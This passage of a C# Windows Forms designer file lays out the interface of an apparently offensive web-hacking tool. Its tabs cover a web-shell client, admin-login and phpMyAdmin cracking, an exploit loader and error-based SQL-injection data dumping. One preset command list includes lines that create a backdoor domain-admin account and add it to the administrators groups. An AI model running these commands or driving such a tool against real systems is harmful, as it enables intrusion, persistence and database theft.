            "ipconfig",
            "ipconfig /all",
            "ifconfig",
            "ping 机器名",
            "net view /domain",
            "net user /domain",
            "net group /domain",
            "net group \"domain admins\" /domain",
            "net user domain-admin /domain",
            "net time /domain",
            "net user k8team k8team /add /domain",
            "net group \"Domain Admins\" k8team /add /domain",
            "net user k8team k8team /add",
            "net localgroup administrators k8team /add",
            "query user",
            "logoff 1",
            "把id为1的管理员踢下线（就是注销）"});
            this.cbb_WebCommond.Location = new System.Drawing.Point(759, 35);
            this.cbb_WebCommond.Name = "cbb_WebCommond";
            this.cbb_WebCommond.Size = new System.Drawing.Size(143, 20);
            this.cbb_WebCommond.TabIndex = 65;
            this.cbb_WebCommond.Text = "whoami";
            // 
            // rb_aspCmd
            // 
            this.rb_aspCmd.AutoSize = true;
            this.rb_aspCmd.Location = new System.Drawing.Point(178, 35);
            this.rb_aspCmd.Name = "rb_aspCmd";
            this.rb_aspCmd.Size = new System.Drawing.Size(41, 16);
            this.rb_aspCmd.TabIndex = 62;
            this.rb_aspCmd.Text = "ASP";
            this.rb_aspCmd.UseVisualStyleBackColor = true;
            // 
            // label11
            // 
            this.label11.AutoSize = true;
            this.label11.Location = new System.Drawing.Point(594, 36);
            this.label11.Name = "label11";
            this.label11.Size = new System.Drawing.Size(35, 12);
            this.label11.TabIndex = 61;
            this.label11.Text = "超时:";
            // 
            // txt_TimeOutCmd
            // 
            this.txt_TimeOutCmd.Location = new System.Drawing.Point(635, 32);
            this.txt_TimeOutCmd.Name = "txt_TimeOutCmd";
            this.txt_TimeOutCmd.Size = new System.Drawing.Size(43, 21);
            this.txt_TimeOutCmd.TabIndex = 60;
            this.txt_TimeOutCmd.Text = "80000";
            // 
            // label10
            // 
            this.label10.AutoSize = true;
            this.label10.Location = new System.Drawing.Point(488, 36);
            this.label10.Name = "label10";
            this.label10.Size = new System.Drawing.Size(35, 12);
            this.label10.TabIndex = 59;
            this.label10.Text = "编码:";
            // 
            // cbb_utf8Gb3212CMD
            // 
            this.cbb_utf8Gb3212CMD.FormattingEnabled = true;
            this.cbb_utf8Gb3212CMD.Items.AddRange(new object[] {
            "UTF-8",
            "GB2312"});
            this.cbb_utf8Gb3212CMD.Location = new System.Drawing.Point(529, 32);
            this.cbb_utf8Gb3212CMD.Name = "cbb_utf8Gb3212CMD";
            this.cbb_utf8Gb3212CMD.Size = new System.Drawing.Size(59, 20);
            this.cbb_utf8Gb3212CMD.TabIndex = 58;
            this.cbb_utf8Gb3212CMD.Text = "UTF-8";
            // 
            // rb_jspCmd
            // 
            this.rb_jspCmd.AutoSize = true;
            this.rb_jspCmd.Location = new System.Drawing.Point(225, 35);
            this.rb_jspCmd.Name = "rb_jspCmd";
            this.rb_jspCmd.Size = new System.Drawing.Size(41, 16);
            this.rb_jspCmd.TabIndex = 57;
            this.rb_jspCmd.Text = "JSP";
            this.rb_jspCmd.UseVisualStyleBackColor = true;
            // 
            // rb_phpCmd
            // 
            this.rb_phpCmd.AutoSize = true;
            this.rb_phpCmd.Location = new System.Drawing.Point(131, 35);
            this.rb_phpCmd.Name = "rb_phpCmd";
            this.rb_phpCmd.Size = new System.Drawing.Size(41, 16);
            this.rb_phpCmd.TabIndex = 56;
            this.rb_phpCmd.Text = "PHP";
            this.rb_phpCmd.UseVisualStyleBackColor = true;
            // 
            // label9
            // 
            this.label9.AutoSize = true;
            this.label9.Location = new System.Drawing.Point(7, 37);
            this.label9.Name = "label9";
            this.label9.Size = new System.Drawing.Size(59, 12);
            this.label9.TabIndex = 55;
            this.label9.Text = "脚本类型:";
            // 
            // rb_aspxCmd
            // 
            this.rb_aspxCmd.AutoSize = true;
            this.rb_aspxCmd.Checked = true;
            this.rb_aspxCmd.Location = new System.Drawing.Point(78, 35);
            this.rb_aspxCmd.Name = "rb_aspxCmd";
            this.rb_aspxCmd.Size = new System.Drawing.Size(47, 16);
            this.rb_aspxCmd.TabIndex = 54;
            this.rb_aspxCmd.TabStop = true;
            this.rb_aspxCmd.Text = "ASPX";
            this.rb_aspxCmd.UseVisualStyleBackColor = true;
            // 
            // btn_ExecuteWebCMD
            // 
            this.btn_ExecuteWebCMD.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.btn_ExecuteWebCMD.Enabled = false;
            this.btn_ExecuteWebCMD.Location = new System.Drawing.Point(915, 32);
            this.btn_ExecuteWebCMD.Name = "btn_ExecuteWebCMD";
            this.btn_ExecuteWebCMD.Size = new System.Drawing.Size(59, 23);
            this.btn_ExecuteWebCMD.TabIndex = 53;
            this.btn_ExecuteWebCMD.Text = "执行";
            this.btn_ExecuteWebCMD.UseVisualStyleBackColor = true;
            this.btn_ExecuteWebCMD.Click += new System.EventHandler(this.btn_ExecuteWebCMD_Click);
            // 
            // btn_connectOneShell
            // 
            this.btn_connectOneShell.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.btn_connectOneShell.Location = new System.Drawing.Point(915, 6);
            this.btn_connectOneShell.Name = "btn_connectOneShell";
            this.btn_connectOneShell.Size = new System.Drawing.Size(59, 23);
            this.btn_connectOneShell.TabIndex = 53;
            this.btn_connectOneShell.Text = "连接";
            this.btn_connectOneShell.UseVisualStyleBackColor = true;
            this.btn_connectOneShell.Click += new System.EventHandler(this.btn_connectOneShell_Click);
            // 
            // txt_OneShellPwd
            // 
            this.txt_OneShellPwd.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.txt_OneShellPwd.Location = new System.Drawing.Point(759, 8);
            this.txt_OneShellPwd.Name = "txt_OneShellPwd";
            this.txt_OneShellPwd.Size = new System.Drawing.Size(143, 21);
            this.txt_OneShellPwd.TabIndex = 51;
            this.txt_OneShellPwd.Text = "tom";
            // 
            // label7
            // 
            this.label7.AutoSize = true;
            this.label7.Location = new System.Drawing.Point(7, 9);
            this.label7.Name = "label7";
            this.label7.Size = new System.Drawing.Size(47, 12);
            this.label7.TabIndex = 50;
            this.label7.Text = "一句话:";
            // 
            // txt_OneShellPath
            // 
            this.txt_OneShellPath.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left)
                        | System.Windows.Forms.AnchorStyles.Right)));
            this.txt_OneShellPath.Location = new System.Drawing.Point(78, 6);
            this.txt_OneShellPath.Name = "txt_OneShellPath";
            this.txt_OneShellPath.Size = new System.Drawing.Size(600, 21);
            this.txt_OneShellPath.TabIndex = 49;
            this.txt_OneShellPath.TextChanged += new System.EventHandler(this.txt_OneShellPath_TextChanged);
            // 
            // txt_WebCmdResult
            // 
            this.txt_WebCmdResult.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)
                        | System.Windows.Forms.AnchorStyles.Left)
                        | System.Windows.Forms.AnchorStyles.Right)));
            this.txt_WebCmdResult.BackColor = System.Drawing.SystemColors.Window;
            this.txt_WebCmdResult.Enabled = false;
            this.txt_WebCmdResult.ForeColor = System.Drawing.SystemColors.WindowText;
            this.txt_WebCmdResult.Location = new System.Drawing.Point(3, 58);
            this.txt_WebCmdResult.Multiline = true;
            this.txt_WebCmdResult.Name = "txt_WebCmdResult";
            this.txt_WebCmdResult.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
            this.txt_WebCmdResult.Size = new System.Drawing.Size(675, 563);
            this.txt_WebCmdResult.TabIndex = 47;
            this.txt_WebCmdResult.KeyDown += new System.Windows.Forms.KeyEventHandler(this.txt_WebCmdResult_KeyDown);
            // 
            // chk_VisbleOnePwd
            // 
            this.chk_VisbleOnePwd.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.chk_VisbleOnePwd.AutoSize = true;
            this.chk_VisbleOnePwd.Location = new System.Drawing.Point(684, 8);
            this.chk_VisbleOnePwd.Name = "chk_VisbleOnePwd";
            this.chk_VisbleOnePwd.Size = new System.Drawing.Size(78, 16);
            this.chk_VisbleOnePwd.TabIndex = 63;
            this.chk_VisbleOnePwd.Text = "显示密码:";
            this.chk_VisbleOnePwd.UseVisualStyleBackColor = true;
            this.chk_VisbleOnePwd.CheckedChanged += new System.EventHandler(this.chk_VisbleOnePwd_CheckedChanged);
            // 
            // label6
            // 
            this.label6.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.label6.AutoSize = true;
            this.label6.Location = new System.Drawing.Point(684, 37);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(71, 12);
            this.label6.TabIndex = 59;
            this.label6.Text = "欲执行命令:";
            // 
            // tab_webLoginCrack
            // 
            this.tab_webLoginCrack.Controls.Add(this.label13);
            this.tab_webLoginCrack.Controls.Add(this.btn_DiyloginUrlCrack);
            this.tab_webLoginCrack.Controls.Add(this.button1);
            this.tab_webLoginCrack.ImageIndex = 20;
            this.tab_webLoginCrack.Location = new System.Drawing.Point(4, 4);
            this.tab_webLoginCrack.Name = "tab_webLoginCrack";
            this.tab_webLoginCrack.Padding = new System.Windows.Forms.Padding(3);
            this.tab_webLoginCrack.Size = new System.Drawing.Size(980, 623);
            this.tab_webLoginCrack.TabIndex = 4;
            this.tab_webLoginCrack.Text = "WebLoginCrack";
            this.tab_webLoginCrack.UseVisualStyleBackColor = true;
            // 
            // label13
            // 
            this.label13.AutoSize = true;
            this.label13.Location = new System.Drawing.Point(411, 44);
            this.label13.Name = "label13";
            this.label13.Size = new System.Drawing.Size(131, 12);
            this.label13.TabIndex = 90;
            this.label13.Text = "等哥有空先会更新的...";
            // 
            // btn_DiyloginUrlCrack
            // 
            this.btn_DiyloginUrlCrack.Location = new System.Drawing.Point(16, 6);
            this.btn_DiyloginUrlCrack.Name = "btn_DiyloginUrlCrack";
            this.btn_DiyloginUrlCrack.Size = new System.Drawing.Size(112, 23);
            this.btn_DiyloginUrlCrack.TabIndex = 89;
            this.btn_DiyloginUrlCrack.Text = "自定义后台破解";
            this.btn_DiyloginUrlCrack.UseVisualStyleBackColor = true;
            this.btn_DiyloginUrlCrack.Click += new System.EventHandler(this.btn_DiyloginUrlCrack_Click);
            // 
            // button1
            // 
            this.button1.Location = new System.Drawing.Point(16, 44);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(112, 23);
            this.button1.TabIndex = 88;
            this.button1.Text = "phpMyAdmin破解";
            this.button1.UseVisualStyleBackColor = true;
            this.button1.Click += new System.EventHandler(this.button1_Click_1);
            // 
            // tab_ExploitManage
            // 
            this.tab_ExploitManage.Controls.Add(this.button2);
            this.tab_ExploitManage.Controls.Add(this.txt_ExpURL);
            this.tab_ExploitManage.Controls.Add(this.tab_webExp);
            this.tab_ExploitManage.Controls.Add(this.button9);
            this.tab_ExploitManage.Controls.Add(this.button8);
            this.tab_ExploitManage.Controls.Add(this.btn_WebExploitNivigate);
            this.tab_ExploitManage.Controls.Add(this.label12);
            this.tab_ExploitManage.Controls.Add(this.web_exploit);
            this.tab_ExploitManage.ImageIndex = 37;
            this.tab_ExploitManage.Location = new System.Drawing.Point(4, 4);
            this.tab_ExploitManage.Name = "tab_ExploitManage";
            this.tab_ExploitManage.Padding = new System.Windows.Forms.Padding(3);
            this.tab_ExploitManage.Size = new System.Drawing.Size(980, 623);
            this.tab_ExploitManage.TabIndex = 8;
            this.tab_ExploitManage.Text = "Exploit-DB";
            this.tab_ExploitManage.UseVisualStyleBackColor = true;
            // 
            // button2
            // 
            this.button2.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.button2.Location = new System.Drawing.Point(464, 4);
            this.button2.Name = "button2";
            this.button2.Size = new System.Drawing.Size(63, 23);
            this.button2.TabIndex = 65;
            this.button2.Text = "加载EXP";
            this.button2.UseVisualStyleBackColor = true;
            this.button2.Visible = false;
            this.button2.Click += new System.EventHandler(this.button2_Click_1);
            // 
            // txt_ExpURL
            // 
            this.txt_ExpURL.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left)
                        | System.Windows.Forms.AnchorStyles.Right)));
            this.txt_ExpURL.Location = new System.Drawing.Point(52, 6);
            this.txt_ExpURL.Name = "txt_ExpURL";
            this.txt_ExpURL.Size = new System.Drawing.Size(639, 21);
            this.txt_ExpURL.TabIndex = 57;
            this.txt_ExpURL.KeyDown += new System.Windows.Forms.KeyEventHandler(this.txt_ExpURL_KeyDown);
            // 
            // tab_webExp
            // 
            this.tab_webExp.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left)
                        | System.Windows.Forms.AnchorStyles.Right)));
            this.tab_webExp.ContextMenuStrip = this.rm_ExpMgrInOut;
            this.tab_webExp.Location = new System.Drawing.Point(9, 33);
            this.tab_webExp.Name = "tab_webExp";
            this.tab_webExp.SelectedIndex = 0;
            this.tab_webExp.Size = new System.Drawing.Size(965, 186);
            this.tab_webExp.TabIndex = 63;
            // 
            // rm_ExpMgrInOut
            // 
            this.rm_ExpMgrInOut.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.重新加载EXPToolStripMenuItem,
            this.toolStripMenuItem5,
            this.expInputToolStripMenuItem});
            this.rm_ExpMgrInOut.Name = "rm_ExpMgrInOut";
            this.rm_ExpMgrInOut.Size = new System.Drawing.Size(173, 54);
            // 
            // 重新加载EXPToolStripMenuItem
            // 
            this.重新加载EXPToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("重新加载EXPToolStripMenuItem.Image")));
            this.重新加载EXPToolStripMenuItem.Name = "重新加载EXPToolStripMenuItem";
            this.重新加载EXPToolStripMenuItem.Size = new System.Drawing.Size(172, 22);
            this.重新加载EXPToolStripMenuItem.Text = "重新加载EXP(刷新)";
            this.重新加载EXPToolStripMenuItem.Click += new System.EventHandler(this.重新加载EXPToolStripMenuItem_Click);
            // 
            // toolStripMenuItem5
            // 
            this.toolStripMenuItem5.Name = "toolStripMenuItem5";
            this.toolStripMenuItem5.Size = new System.Drawing.Size(169, 6);
            // 
            // expInputToolStripMenuItem
            // 
            this.expInputToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("expInputToolStripMenuItem.Image")));
            this.expInputToolStripMenuItem.Name = "expInputToolStripMenuItem";
            this.expInputToolStripMenuItem.Size = new System.Drawing.Size(172, 22);
            this.expInputToolStripMenuItem.Text = "导入其它数据库EXP";
            this.expInputToolStripMenuItem.Click += new System.EventHandler(this.expInputToolStripMenuItem_Click);
            // 
            // button9
            // 
            this.button9.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.button9.Location = new System.Drawing.Point(877, 5);
            this.button9.Name = "button9";
            this.button9.Size = new System.Drawing.Size(96, 23);
            this.button9.TabIndex = 61;
            this.button9.Text = "md5decrypter";
            this.button9.UseVisualStyleBackColor = true;
            this.button9.Click += new System.EventHandler(this.button9_Click);
            // 
            // button8
            // 
            this.button8.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.button8.Location = new System.Drawing.Point(801, 5);
            this.button8.Name = "button8";
            this.button8.Size = new System.Drawing.Size(66, 23);
            this.button8.TabIndex = 60;
            this.button8.Text = "cmd5.com";
            this.button8.UseVisualStyleBackColor = true;
            this.button8.Click += new System.EventHandler(this.button8_Click);
            // 
            // btn_WebExploitNivigate
            // 
            this.btn_WebExploitNivigate.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.btn_WebExploitNivigate.Image = ((System.Drawing.Image)(resources.GetObject("btn_WebExploitNivigate.Image")));
            this.btn_WebExploitNivigate.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.btn_WebExploitNivigate.Location = new System.Drawing.Point(697, 5);
            this.btn_WebExploitNivigate.Name = "btn_WebExploitNivigate";
            this.btn_WebExploitNivigate.Size = new System.Drawing.Size(94, 23);
            this.btn_WebExploitNivigate.TabIndex = 59;
            this.btn_WebExploitNivigate.Text = "robots.txt";
            this.btn_WebExploitNivigate.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
            this.btn_WebExploitNivigate.UseVisualStyleBackColor = true;
            this.btn_WebExploitNivigate.Click += new System.EventHandler(this.btn_WebExploitNivigate_Click);
            // 
            // label12
            // 
            this.label12.AutoSize = true;
            this.label12.Location = new System.Drawing.Point(7, 9);
            this.label12.Name = "label12";
            this.label12.Size = new System.Drawing.Size(41, 12);
            this.label12.TabIndex = 58;
            this.label12.Text = "网址：";
            // 
            // web_exploit
            // 
            this.web_exploit.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)
                        | System.Windows.Forms.AnchorStyles.Left)
                        | System.Windows.Forms.AnchorStyles.Right)));
            this.web_exploit.Location = new System.Drawing.Point(6, 229);
            this.web_exploit.MinimumSize = new System.Drawing.Size(20, 20);
            this.web_exploit.Name = "web_exploit";
            this.web_exploit.ScriptErrorsSuppressed = true;
            this.web_exploit.Size = new System.Drawing.Size(968, 394);
            this.web_exploit.TabIndex = 4;
            this.web_exploit.DocumentCompleted += new System.Windows.Forms.WebBrowserDocumentCompletedEventHandler(this.web_exploit_DocumentCompleted);
            // 
            // tab_DataOutput
            // 
            this.tab_DataOutput.Controls.Add(this.lbl_resultDataOut);
            this.tab_DataOutput.Controls.Add(this.lbl_found);
            this.tab_DataOutput.Controls.Add(this.lbl_check);
            this.tab_DataOutput.Controls.Add(this.gb_dataOutput);
            this.tab_DataOutput.Controls.Add(this.txt_resultDataOut);
            this.tab_DataOutput.ImageIndex = 51;
            this.tab_DataOutput.Location = new System.Drawing.Point(4, 4);
            this.tab_DataOutput.Name = "tab_DataOutput";
            this.tab_DataOutput.Size = new System.Drawing.Size(980, 623);
            this.tab_DataOutput.TabIndex = 9;
            this.tab_DataOutput.Text = "DataOutput";
            this.tab_DataOutput.UseVisualStyleBackColor = true;
            // 
            // lbl_resultDataOut
            // 
            this.lbl_resultDataOut.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.lbl_resultDataOut.AutoSize = true;
            this.lbl_resultDataOut.BackColor = System.Drawing.Color.Transparent;
            this.lbl_resultDataOut.Location = new System.Drawing.Point(202, 607);
            this.lbl_resultDataOut.Name = "lbl_resultDataOut";
            this.lbl_resultDataOut.Size = new System.Drawing.Size(59, 12);
            this.lbl_resultDataOut.TabIndex = 28;
            this.lbl_resultDataOut.Text = "脱库速度:";
            // 
            // lbl_found
            // 
            this.lbl_found.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.lbl_found.AutoSize = true;
            this.lbl_found.BackColor = System.Drawing.Color.Transparent;
            this.lbl_found.Font = new System.Drawing.Font("SimSun", 9F);
            this.lbl_found.ForeColor = System.Drawing.SystemColors.ControlText;
            this.lbl_found.Location = new System.Drawing.Point(104, 607);
            this.lbl_found.Name = "lbl_found";
            this.lbl_found.Size = new System.Drawing.Size(41, 12);
            this.lbl_found.TabIndex = 23;
            this.lbl_found.Text = "有效:0";
            // 
            // lbl_check
            // 
            this.lbl_check.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.lbl_check.AutoSize = true;
            this.lbl_check.BackColor = System.Drawing.Color.Transparent;
            this.lbl_check.Font = new System.Drawing.Font("SimSun", 9F);
            this.lbl_check.ForeColor = System.Drawing.SystemColors.ControlText;
            this.lbl_check.Location = new System.Drawing.Point(3, 607);
            this.lbl_check.Name = "lbl_check";
            this.lbl_check.Size = new System.Drawing.Size(41, 12);
            this.lbl_check.TabIndex = 22;
            this.lbl_check.Text = "检测:0";
            // 
            // gb_dataOutput
            // 
            this.gb_dataOutput.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left)
                        | System.Windows.Forms.AnchorStyles.Right)));
            this.gb_dataOutput.Controls.Add(this.txt_dataOutEndStr);
            this.gb_dataOutput.Controls.Add(this.txt_dataOutstartStr);
            this.gb_dataOutput.Controls.Add(this.chk_DataOutRegex);
            this.gb_dataOutput.Controls.Add(this.rb_PostDataOut);
            this.gb_dataOutput.Controls.Add(this.rb_GetDataOut);
            this.gb_dataOutput.Controls.Add(this.txt_sqlDataOutput);
            this.gb_dataOutput.Controls.Add(this.txt_urlDataOutput);
            this.gb_dataOutput.Controls.Add(this.pictureBox14);
            this.gb_dataOutput.Controls.Add(this.label20);
            this.gb_dataOutput.Controls.Add(this.pictureBox13);
            this.gb_dataOutput.Controls.Add(this.label24);
            this.gb_dataOutput.Controls.Add(this.txt_ThreadsOutData);
            this.gb_dataOutput.Controls.Add(this.txt_maxnum);
            this.gb_dataOutput.Controls.Add(this.txt_minnum);
            this.gb_dataOutput.Controls.Add(this.cbb_DataOutEncoding);
            this.gb_dataOutput.Controls.Add(this.btn_dataOutputMul);
            this.gb_dataOutput.Controls.Add(this.lbl_threads);
            this.gb_dataOutput.Controls.Add(this.label17);
            this.gb_dataOutput.Controls.Add(this.label18);
            this.gb_dataOutput.Controls.Add(this.label19);
            this.gb_dataOutput.Controls.Add(this.chk_DataOutputSetting);
            this.gb_dataOutput.Controls.Add(this.lbl_dataOutEndStr);
            this.gb_dataOutput.Controls.Add(this.lbl_dataOutStrStart);
            this.gb_dataOutput.Controls.Add(this.button4);
            this.gb_dataOutput.Controls.Add(this.label23);
            this.gb_dataOutput.Controls.Add(this.btn_DataOutput);
            this.gb_dataOutput.Controls.Add(this.btn_OutDataStop);
            this.gb_dataOutput.Controls.Add(this.txt_dataOutRegex);
            this.gb_dataOutput.Controls.Add(this.lbl_dataOutRexex);
            this.gb_dataOutput.ForeColor = System.Drawing.SystemColors.ControlText;
            this.gb_dataOutput.Location = new System.Drawing.Point(3, 3);
            this.gb_dataOutput.Name = "gb_dataOutput";
            this.gb_dataOutput.Size = new System.Drawing.Size(974, 133);
            this.gb_dataOutput.TabIndex = 24;
            this.gb_dataOutput.TabStop = false;
            // 
            // txt_dataOutEndStr
            // 
            this.txt_dataOutEndStr.Location = new System.Drawing.Point(365, 103);
            this.txt_dataOutEndStr.Name = "txt_dataOutEndStr";
            this.txt_dataOutEndStr.Size = new System.Drawing.Size(150, 21);
            this.txt_dataOutEndStr.TabIndex = 32;
            this.txt_dataOutEndStr.Text = "\' for key \'group_key";
            // 
            // txt_dataOutstartStr
            // 
            this.txt_dataOutstartStr.Location = new System.Drawing.Point(160, 103);
            this.txt_dataOutstartStr.Name = "txt_dataOutstartStr";
            this.txt_dataOutstartStr.Size = new System.Drawing.Size(159, 21);
            this.txt_dataOutstartStr.TabIndex = 31;
            this.txt_dataOutstartStr.Text = "Duplicate entry \'";
            // 
            // chk_DataOutRegex
            // 
            this.chk_DataOutRegex.AutoSize = true;
            this.chk_DataOutRegex.Location = new System.Drawing.Point(523, 107);
            this.chk_DataOutRegex.Name = "chk_DataOutRegex";
            this.chk_DataOutRegex.Size = new System.Drawing.Size(72, 16);
            this.chk_DataOutRegex.TabIndex = 88;
            this.chk_DataOutRegex.Text = "使用正则";
            this.chk_DataOutRegex.UseVisualStyleBackColor = true;
            this.chk_DataOutRegex.CheckedChanged += new System.EventHandler(this.chk_DataOutRegex_CheckedChanged);
            // 
            // rb_PostDataOut
            // 
            this.rb_PostDataOut.AutoSize = true;
            this.rb_PostDataOut.BackColor = System.Drawing.Color.Transparent;
            this.rb_PostDataOut.ForeColor = System.Drawing.SystemColors.ControlText;
            this.rb_PostDataOut.Location = new System.Drawing.Point(106, 79);
            this.rb_PostDataOut.Name = "rb_PostDataOut";
            this.rb_PostDataOut.Size = new System.Drawing.Size(47, 16);
            this.rb_PostDataOut.TabIndex = 38;
            this.rb_PostDataOut.Text = "POST";
            this.rb_PostDataOut.UseVisualStyleBackColor = false;
            // 
            // rb_GetDataOut
            // 
            this.rb_GetDataOut.AutoSize = true;
            this.rb_GetDataOut.BackColor = System.Drawing.Color.Transparent;
            this.rb_GetDataOut.Checked = true;
            this.rb_GetDataOut.ForeColor = System.Drawing.SystemColors.ControlText;
            this.rb_GetDataOut.Location = new System.Drawing.Point(57, 79);
            this.rb_GetDataOut.Name = "rb_GetDataOut";
            this.rb_GetDataOut.Size = new System.Drawing.Size(41, 16);
            this.rb_GetDataOut.TabIndex = 36;
            this.rb_GetDataOut.TabStop = true;
            this.rb_GetDataOut.Text = "GET";
            this.rb_GetDataOut.UseVisualStyleBackColor = false;
            // 
            // txt_sqlDataOutput
            // 
            this.txt_sqlDataOutput.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left)
                        | System.Windows.Forms.AnchorStyles.Right)));
            this.txt_sqlDataOutput.Location = new System.Drawing.Point(57, 47);
            this.txt_sqlDataOutput.Name = "txt_sqlDataOutput";
            this.txt_sqlDataOutput.Size = new System.Drawing.Size(907, 21);
            this.txt_sqlDataOutput.TabIndex = 21;
            // 
            // txt_urlDataOutput
            // 
            this.txt_urlDataOutput.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left)
                        | System.Windows.Forms.AnchorStyles.Right)));
            this.txt_urlDataOutput.Location = new System.Drawing.Point(57, 20);
            this.txt_urlDataOutput.Name = "txt_urlDataOutput";
            this.txt_urlDataOutput.Size = new System.Drawing.Size(907, 21);
            this.txt_urlDataOutput.TabIndex = 20;
            this.txt_urlDataOutput.TextChanged += new System.EventHandler(this.txt_urlDataOutput_TextChanged);
            // 
            // pictureBox14
            // 
            this.pictureBox14.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox14.Image")));
            this.pictureBox14.Location = new System.Drawing.Point(0, 79);
            this.pictureBox14.Name = "pictureBox14";
            this.pictureBox14.Size = new System.Drawing.Size(16, 16);
            this.pictureBox14.TabIndex = 87;
            this.pictureBox14.TabStop = false;
            // 
            // label20
            // 
            this.label20.AutoSize = true;
            this.label20.Location = new System.Drawing.Point(21, 81);
            this.label20.Name = "label20";
            this.label20.Size = new System.Drawing.Size(35, 12);
            this.label20.TabIndex = 86;
            this.label20.Text = "方式:";
            // 
            // pictureBox13
            // 
            this.pictureBox13.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox13.Image")));
            this.pictureBox13.Location = new System.Drawing.Point(0, 22);
            this.pictureBox13.Name = "pictureBox13";
            this.pictureBox13.Size = new System.Drawing.Size(16, 16);
            this.pictureBox13.TabIndex = 85;
            this.pictureBox13.TabStop = false;
            // 
            // label24
            // 
            this.label24.AutoSize = true;
            this.label24.Location = new System.Drawing.Point(21, 23);
            this.label24.Name = "label24";
            this.label24.Size = new System.Drawing.Size(35, 12);
            this.label24.TabIndex = 84;
            this.label24.Text = "网址:";
            // 
            // txt_ThreadsOutData
            // 
            this.txt_ThreadsOutData.Font = new System.Drawing.Font("SimSun", 9F);
            this.txt_ThreadsOutData.Location = new System.Drawing.Point(574, 75);
            this.txt_ThreadsOutData.Name = "txt_ThreadsOutData";
            this.txt_ThreadsOutData.Size = new System.Drawing.Size(44, 21);
            this.txt_ThreadsOutData.TabIndex = 42;
            this.txt_ThreadsOutData.Text = "30";
            this.txt_ThreadsOutData.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            // 
            // txt_maxnum
            // 
            this.txt_maxnum.Location = new System.Drawing.Point(462, 75);
            this.txt_maxnum.Name = "txt_maxnum";
            this.txt_maxnum.Size = new System.Drawing.Size(53, 21);
            this.txt_maxnum.TabIndex = 28;
            this.txt_maxnum.Text = "50";
            // 
            // txt_minnum
            // 
            this.txt_minnum.Location = new System.Drawing.Point(365, 75);
            this.txt_minnum.Name = "txt_minnum";
            this.txt_minnum.Size = new System.Drawing.Size(49, 21);
            this.txt_minnum.TabIndex = 29;
            this.txt_minnum.Text = "1";
            // 
            // cbb_DataOutEncoding
            // 
            this.cbb_DataOutEncoding.FormattingEnabled = true;
            this.cbb_DataOutEncoding.Items.AddRange(new object[] {
            "字符编码",
            "Unicode(全世界)",
            "UTF-8(国际编码)",
            "GBK(GB2312+Big5+古汉语)",
            "GB2312(国标码-简体中文)",
            "Big5(港澳台-繁体中文)",
            "Euc-KR(韩文)",
            "Euc-JP(日文)",
            "Shift_JIS(日本电脑系统编码)",
            "Windows-1251(俄国)",
            "Windows-874(泰国)",
            "Windows-1258(越南字符)",
            "Ks_c_5601-1987(朝鲜语)",
            "Windows-1250(中欧字符)",
            "Windows-1251(西里尔字符)",
            "Windows-1252(西欧字符)",
            "Windows-1253(希腊字符)",
            "Windows-1254(土耳其字符)",
            "Windows-1255(希伯来字符)",
            "Windows-1256(阿拉伯字符)",
            "Windows-1257(波罗的海字符)"});
            this.cbb_DataOutEncoding.Location = new System.Drawing.Point(160, 75);
            this.cbb_DataOutEncoding.Name = "cbb_DataOutEncoding";
            this.cbb_DataOutEncoding.Size = new System.Drawing.Size(159, 20);
